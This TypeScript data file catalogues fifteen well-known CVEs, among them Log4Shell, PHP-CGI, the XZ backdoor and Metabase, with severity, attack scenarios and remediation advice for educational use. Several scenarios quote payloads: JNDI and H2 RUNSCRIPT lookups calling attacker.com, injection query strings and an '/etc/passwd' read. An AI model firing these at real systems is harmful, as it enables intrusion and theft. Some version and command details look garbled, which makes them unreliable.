export interface CVEInfo {
  cveId: string;
  title: string;
  description: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  cvssScore: number;
  publishedDate: string;
  affectedSoftware: string;
  affectedVersion: string;
  fixedVersion: string;
  references: string[];
  // Educational Metrics
  attackComplexity: 'Low' | 'High';
  privilegesRequired: 'None' | 'Low' | 'High';
  userInteraction: 'None' | 'Required';
  impact: 'Complete System Compromise' | 'High Impact' | 'Partial Access' | 'Low Impact';
  exploitAvailability: 'Public Exploit Available' | 'Proof of Concept Available' | 'No Active Exploit';
  attackScenario: string;
  remediationRecommendation: string;
}

export const cveDatabase: CVEInfo[] = [
  {
    cveId: 'CVE-2024-4577',
    title: 'PHP-CGI Remote Code Execution Vulnerability',
    description: 'A vulnerability in PHP when running in CGI mode on Windows architectures allows arguments to be passed directly to the PHP interpreter. This enables unauthenticated attackers to execute arbitrary shell commands via query parameter injection.',
    severity: 'Critical',
    cvssScore: 9.8,
    publishedDate: '2024-06-06',
    affectedSoftware: 'PHP',
    affectedVersion: '8.1.0',
    fixedVersion: '8.1.29',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-4577',
      'https://devco.re/blog/2024/06/06/play-with-php-cgi-argument-injection-cve-2024-4577/'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker sends a POST request containing query parameters like "?%d+d+allow_url_include%3d1+%d+auto_prepend_file%3dphp://input" followed by PHP code in the request body. Due to improper character encoding conversions on Windows, the CGI handler parses these as CLI arguments and executes the code.',
    remediationRecommendation: 'Upgrade PHP to version 8.1.29, 8.2.20, or 8.3.8. Alternatively, configure URL Rewrite rules to reject query parameters containing PHP executable directives.'
  },
  {
    cveId: 'CVE-2023-25690',
    title: 'Apache HTTP Server Request Smuggling / Rewrite RCE',
    description: 'An issue in Apache HTTP Server 2.4.55 and prior allows HTTP request smuggling. When configured as a reverse proxy, specific mod_rewrite configurations allow HTTP requests to be mapped into backend endpoints directly, bypassing authentication.',
    severity: 'Critical',
    cvssScore: 9.8,
    publishedDate: '2023-03-07',
    affectedSoftware: 'Apache HTTP Server',
    affectedVersion: '2.4.55',
    fixedVersion: '2.4.56',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2023-25690',
      'https://httpd.apache.org/security/vulnerabilities_24.html'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker smuggles control characters in HTTP headers. The proxy forwards these characters directly to backend application servers, allowing the attacker to inject secondary requests that bypass proxy controls.',
    remediationRecommendation: 'Update Apache HTTP Server to version 2.4.56 or higher, and verify that rewrite mappings do not contain unvalidated URL inputs.'
  },
  {
    cveId: 'CVE-2023-38545',
    title: 'curl SOCKS5 Heap Buffer Overflow',
    description: 'A heap buffer overflow vulnerability in libcurl occurs during the SOCKS5 handshake. When a host name is too long to fit in the pre-allocated SOCKS5 buffer, curl copies it using an overflowable destination offset, allowing remote heap corruption.',
    severity: 'High',
    cvssScore: 7.5,
    publishedDate: '2023-10-11',
    affectedSoftware: 'curl',
    affectedVersion: '8.3.0',
    fixedVersion: '8.4.0',
    references: [
      'https://curl.se/docs/CVE-2023-38545.html',
      'https://nvd.nist.gov/vuln/detail/CVE-2023-38545'
    ],
    attackComplexity: 'High',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'High Impact',
    exploitAvailability: 'Proof of Concept Available',
    attackScenario: 'A server redirects a curl client using a SOCKS5 proxy to a hostname longer than 255 bytes. Due to a coding error, curl incorrectly reverts to local resolving but copies the too-long hostname to a heap buffer without boundary checks, triggering an overflow.',
    remediationRecommendation: 'Update curl/libcurl to version 8.4.0 or higher. Limit maximum redirect hostnames to safe sizes.'
  },
  {
    cveId: 'CVE-2024-6387',
    title: 'OpenSSH regreSSHion Remote Code Execution',
    description: 'A signal handler race condition in OpenSSH Server (sshd) on glibc-based Linux systems allows unauthenticated remote code execution. If a client does not authenticate within the LoginGraceTime limit, the SIGALRM handler executes asynchronously in an unsafe manner.',
    severity: 'High',
    cvssScore: 8.1,
    publishedDate: '2024-07-01',
    affectedSoftware: 'OpenSSH Server',
    affectedVersion: '8.9p1',
    fixedVersion: '9.8p1',
    references: [
      'https://www.qualys.com/2024/07/01/regresshion/regresshion.txt',
      'https://nvd.nist.gov/vuln/detail/CVE-2024-6387'
    ],
    attackComplexity: 'High',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker connects to sshd and leaves the session idle. After 120 seconds, the SIGALRM signal fires. During this, sshd calls async-signal-unsafe syslog functions, corrupting glibc heap allocations and leading to attacker-controlled shellcode execution.',
    remediationRecommendation: 'Upgrade to OpenSSH 9.8p1 or newer. Mitigation: Set LoginGraceTime to 0 in /etc/ssh/sshd_config (disables timeout, though it makes the server vulnerable to DoS).'
  },
  {
    cveId: 'CVE-2021-44228',
    title: 'Apache Log4j Log4Shell Remote Code Execution',
    description: 'Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI endpoints. An attacker who can control log messages can execute arbitrary Java code on the target server.',
    severity: 'Critical',
    cvssScore: 10.0,
    publishedDate: '2021-12-10',
    affectedSoftware: 'Apache Log4j',
    affectedVersion: '2.14.1',
    fixedVersion: '2.15.0',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      'https://www.lunasec.io/docs/blog/log4shell-explained/'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker sends a string like "${jndi:ldap://attacker.com/exploit}" in an HTTP User-Agent header. Log4j logs the request header, parses the lookup sequence, connects to the malicious LDAP server, and downloads and runs a Java Class payload.',
    remediationRecommendation: 'Upgrade Apache Log4j to version 2.15.0 or 2.16.0. Or set system property "log4j2.formatMsgNoLookups" to true.'
  },
  {
    cveId: 'CVE-2022-22965',
    title: 'Spring Framework Spring4Shell RCE',
    description: 'A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding. Exploitation allows attackers to manipulate ClassLoaders and overwrite local configuration settings.',
    severity: 'Critical',
    cvssScore: 9.8,
    publishedDate: '2022-03-31',
    affectedSoftware: 'Spring Framework',
    affectedVersion: '5.3.17',
    fixedVersion: '5.3.18',
    references: [
      'https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement',
      'https://nvd.nist.gov/vuln/detail/CVE-2022-22965'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker sends structured parameters like "class.module.classLoader.resources.context.parent.pipeline.first.pattern" in HTTP POST variables, binding custom log parameters to Tomcat Class properties. This lets them write a JSP shell directly into the server web root.',
    remediationRecommendation: 'Upgrade Spring Framework to version 5.3.18 or higher.'
  },
  {
    cveId: 'CVE-2024-3094',
    title: 'XZ Utils Backdoor Remote Code Execution',
    description: 'Malicious code was discovered in the upstream tarballs of XZ Utils starting with version 5.6.0. Through a complex set of obfuscated scripts in the build script, a backdoor gets compiled into liblzma, which is dynamically loaded by sshd, allowing remote authentication bypass.',
    severity: 'Critical',
    cvssScore: 10.0,
    publishedDate: '2024-03-29',
    affectedSoftware: 'XZ Utils',
    affectedVersion: '5.6.0',
    fixedVersion: '5.6.2',
    references: [
      'https://www.openwall.com/lists/oss-security/2024/03/29/4',
      'https://nvd.nist.gov/vuln/detail/CVE-2024-3094'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'The malicious payload modifies the dynamic decryption functions inside sshd during RSA key verification. If a connection is signed with a specific attacker private key, the system executes arbitrary system calls before sshd authenticates the session.',
    remediationRecommendation: 'Downgrade XZ Utils to a known-safe version (e.g., 5.4.6) or upgrade to 5.6.2 where the backdoor code was removed.'
  },
  {
    cveId: 'CVE-2024-21626',
    title: 'runc Container Escape via File Descriptor Leak',
    description: 'runc contains a vulnerability where a file descriptor to the host directory (via /proc/self/fd) can be leaked. An attacker running a container with specific configurations can traverse directories, gain write access to host binaries, and escape the container.',
    severity: 'High',
    cvssScore: 8.6,
    publishedDate: '2024-01-31',
    affectedSoftware: 'runc',
    affectedVersion: '1.1.11',
    fixedVersion: '1.1.12',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-21626',
      'https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'Low',
    userInteraction: 'None',
    impact: 'High Impact',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'The attacker configures container execution settings to set the working directory (cwd) to "/proc/self/fd/7". When the container process starts, it launches inside the host root filesystem directory, letting the container process rewrite host-level libraries like /bin/bash.',
    remediationRecommendation: 'Upgrade runc to version 1.1.12 or newer. Ensure docker/containerd is updated.'
  },
  {
    cveId: 'CVE-2023-38646',
    title: 'Metabase H2 Database Driver RCE',
    description: 'Metabase versions prior to 0.46.6 allow unauthenticated remote attackers to execute arbitrary commands. The endpoint /api/setup/validate accepts connection configuration strings that allow injecting local system commands via the H2 JDBC connection parameters.',
    severity: 'Critical',
    cvssScore: 9.8,
    publishedDate: '2023-07-22',
    affectedSoftware: 'Metabase',
    affectedVersion: '0.46.6',
    fixedVersion: '0.46.6.1',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2023-38646',
      'https://github.com/metabase/metabase/security/advisories/GHSA-fg73-jg72-fdp7'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker makes a POST request to /api/setup/validate with a JSON payload specifying "h2" as the database type, and overrides the connection URL to include an H2 script command: "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM \'http://attacker.com/shell.sql\'". Metabase executes the SQL script containing operating system shellcode.',
    remediationRecommendation: 'Update Metabase to version 0.46.6.1 or newer. Restrict access to setup endpoints.'
  },
  {
    cveId: 'CVE-2023-4863',
    title: 'libwebp Heap Buffer Overflow',
    description: 'A heap buffer overflow vulnerability in libwebp (used globally in web browsers and image viewers) during Huffman coding parsing allows remote attackers to execute code via crafted WebP lossless images.',
    severity: 'Critical',
    cvssScore: 8.8,
    publishedDate: '2023-09-12',
    affectedSoftware: 'libwebp',
    affectedVersion: '1.3.1',
    fixedVersion: '1.3.2',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2023-4863',
      'https://blog.cloudflare.com/how-cloudflare-mitigated-cve-2023-4863/'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'Required',
    impact: 'High Impact',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'A user opens a web page containing a malicious WebP image. The client library attempts to decode the image using libwebp. Huffman tables overflow their pre-allocated arrays, corrupting the heap and triggering execution of arbitrary shellcode within the application sandbox.',
    remediationRecommendation: 'Upgrade libwebp to version 1.3.2 or newer, and verify browser/OS dependencies are patched.'
  },
  {
    cveId: 'CVE-2023-49103',
    title: 'ownCloud WebDAV API Credentials Exposure',
    description: 'An issue in ownCloud allows disclosure of sensitive credentials. The endpoint /apps/oauth2/api/v1/templates exposes the output of phpinfo(), leaking PHP variables containing secret keys, admin emails, and environment passwords.',
    severity: 'Critical',
    cvssScore: 10.0,
    publishedDate: '2023-11-21',
    affectedSoftware: 'ownCloud',
    affectedVersion: '10.13.0',
    fixedVersion: '10.13.1',
    references: [
      'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-info-in-containerized-deployments/',
      'https://nvd.nist.gov/vuln/detail/CVE-2023-49103'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker visits http://server/apps/oauth2/api/v1/templates. The application dumps PHP server settings including DB_PASSWORD, OAUTH_SECRET, and AWS_ACCESS_KEY. The attacker captures these secrets and logs directly into administrative databases.',
    remediationRecommendation: 'Upgrade ownCloud oauth2 app to 0.5.2+, remove vulnerable files, and change all environment credentials immediately.'
  },
  {
    cveId: 'CVE-2023-22515',
    title: 'Confluence Data Center Privilege Escalation',
    description: 'An unauthenticated privilege escalation vulnerability in Confluence Data Center allows attackers to bypass routing filters, access administrative setup endpoints, and create admin accounts directly.',
    severity: 'Critical',
    cvssScore: 10.0,
    publishedDate: '2023-10-04',
    affectedSoftware: 'Confluence',
    affectedVersion: '8.5.1',
    fixedVersion: '8.5.3',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2023-22515',
      'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-1287474475.html'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker sends a request to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false. The routing parameter fools Confluence into believing setup is not complete, which re-enables /setup/setupadministrator.action. The attacker creates an admin user and logs in.',
    remediationRecommendation: 'Upgrade Confluence to version 8.5.3 or newer. Restrict access to sensitive setups.'
  },
  {
    cveId: 'CVE-2024-23897',
    title: 'Jenkins CLI Arbitrary File Read',
    description: 'Jenkins CLI command parsing processes args using an @-character prefix feature. A user sending commands with special characters can cause the server to read arbitrary files from the Jenkins controller file system.',
    severity: 'High',
    cvssScore: 7.5,
    publishedDate: '2024-01-24',
    affectedSoftware: 'Jenkins',
    affectedVersion: '2.441',
    fixedVersion: '2.442',
    references: [
      'https://www.jenkins.io/security/advisory/2024-01-24/',
      'https://nvd.nist.gov/vuln/detail/CVE-2024-23897'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Partial Access',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker runs "jenkins-cliconnect -@/etc/passwd". Jenkins command parser expands the filename prefixed with @, reading its content as the argument, and prints the file content in an error message returned to the client.',
    remediationRecommendation: 'Update Jenkins to version 2.442 or higher. Disable CLI access if not required.'
  },
  {
    cveId: 'CVE-2024-2961',
    title: 'glibc iconv Buffer Overflow',
    description: 'A buffer overflow vulnerability in the iconv function of glibc (GNU C Library) occurs when translating text to the ISO-2022-CN-EXT charset. Unauthenticated remote attackers can execute code if an app passes untrusted strings to iconv.',
    severity: 'High',
    cvssScore: 7.8,
    publishedDate: '2024-04-17',
    affectedSoftware: 'glibc',
    affectedVersion: '2.39',
    fixedVersion: '2.39-r1',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-2961',
      'https://blog.orange.tw/2024/04/cve-2024-2961-glibc-iconv-buffer-overflow.html'
    ],
    attackComplexity: 'High',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'High Impact',
    exploitAvailability: 'Proof of Concept Available',
    attackScenario: 'An attacker sends a payload using ISO-2022-CN-EXT encoding to a web app running PHP or Python. The app processes the string with iconv, causing it to write outside allocated buffers, corrupting local variables and executing shell commands.',
    remediationRecommendation: 'Upgrade glibc to a secure version. Disable unused and dangerous charsets like ISO-2022-CN-EXT.'
  },
  {
    cveId: 'CVE-2023-3519',
    title: 'Citrix ADC Remote Code Execution',
    description: 'An unauthenticated remote code execution vulnerability in Citrix ADC / Gateway allows attackers to execute shellcommands on Gateway appliances configured as SAML Service Providers.',
    severity: 'Critical',
    cvssScore: 9.8,
    publishedDate: '2023-07-18',
    affectedSoftware: 'Citrix ADC',
    affectedVersion: '13.1-48.47',
    fixedVersion: '13.1-49.13',
    references: [
      'https://support.citrix.com/article/CTX561480/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519',
      'https://nvd.nist.gov/vuln/detail/CVE-2023-3519'
    ],
    attackComplexity: 'Low',
    privilegesRequired: 'None',
    userInteraction: 'None',
    impact: 'Complete System Compromise',
    exploitAvailability: 'Public Exploit Available',
    attackScenario: 'An attacker sends a modified SAML response payload containing payload shell commands to Citrix Gateway endpoints. Due to integer boundaries stack checks failing, the payload executes at ROOT privilege on the appliance.',
    remediationRecommendation: 'Apply security patches matching Citrix ADC version 13.1-49.13 or newer.'
  }
];
